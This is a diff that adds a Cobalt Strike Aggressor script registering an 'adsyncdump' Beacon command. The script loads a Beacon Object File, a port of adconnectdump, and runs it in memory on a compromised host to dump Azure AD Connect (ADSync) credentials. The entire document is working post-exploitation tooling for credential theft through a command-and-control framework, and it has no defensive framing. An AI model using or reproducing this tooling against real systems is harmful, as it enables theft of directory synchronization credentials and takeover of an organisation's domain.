@@ -1,0 +1,21 @@
+beacon_command_register(
+    "adsyncdump",
+    "Fully in-memory ADSync credential dumper without without third-party DLL's",
+    "Usage: adsyncdump\n\nThe ADSyncDump BOF is a port of Dirkjan Mollema's adconnectdump.py / ADSyncDecrypt into a Beacon Object File."
+);
+
+alias adsyncdump {
+    $bid = $1;
+
+    # Read the right BOF file
+    println("Reading: adsyncdump." . barch($bid) . ".o");
+    $handle = openf(script_resource("adsyncdump." . barch($bid) . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Announce what we're doing
+    btask($1, "Tasked beacon to dump ADSync credentials (" . sizeof($data) . " bytes)");
+
+    # Execute the BOF
+    beacon_inline_execute($bid, $data, "go", $null);
+}
